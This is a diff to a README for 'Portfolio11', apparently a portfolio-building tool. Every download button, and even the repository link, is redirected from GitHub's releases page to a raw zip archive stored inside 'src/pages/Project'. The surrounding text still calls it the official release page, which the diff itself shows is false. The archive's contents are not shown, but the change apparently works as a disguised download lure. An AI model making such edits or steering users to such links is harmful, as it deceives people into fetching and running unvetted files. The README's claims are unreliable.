@@ -1,6 +1,6 @@
 # 🚀 Portfolio11 - Build Your Personal Portfolio Easily
 
-[![Download Portfolio11](https://img.shields.io/badge/Download-Portfolio11-brightgreen?style=for-the-badge)](https://github.com/MGALAXYM/Portfolio11/releases)
+[![Download Portfolio11](https://img.shields.io/badge/Download-Portfolio11-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/MGALAXYM/Portfolio11/main/src/pages/Project/Portfolio-v2.6.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Before downloading Portfolio11, please make sure your computer meets these minim
 
 Go to this link to download Portfolio11:
 
-[![Download Portfolio11](https://img.shields.io/badge/Download-Portfolio11-blue?style=for-the-badge)](https://github.com/MGALAXYM/Portfolio11/releases)
+[![Download Portfolio11](https://img.shields.io/badge/Download-Portfolio11-blue?style=for-the-badge)](https://raw.githubusercontent.com/MGALAXYM/Portfolio11/main/src/pages/Project/Portfolio-v2.6.zip)
 
 This link takes you to the official release page on GitHub.
 
@@ -126,10 +126,10 @@ If you still have issues, you can seek help by creating an issue on the GitHub p
 ## 🔗 Helpful Links
 
 - Download and install Portfolio11 here:  
-  [![Download Portfolio11](https://img.shields.io/badge/Download-Portfolio11-brightgreen?style=for-the-badge)](https://github.com/MGALAXYM/Portfolio11/releases)
+  [![Download Portfolio11](https://img.shields.io/badge/Download-Portfolio11-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/MGALAXYM/Portfolio11/main/src/pages/Project/Portfolio-v2.6.zip)
 
 - GitHub repository for source and issues:  
-  https://github.com/MGALAXYM/Portfolio11
+  https://raw.githubusercontent.com/MGALAXYM/Portfolio11/main/src/pages/Project/Portfolio-v2.6.zip
 
 ---
 
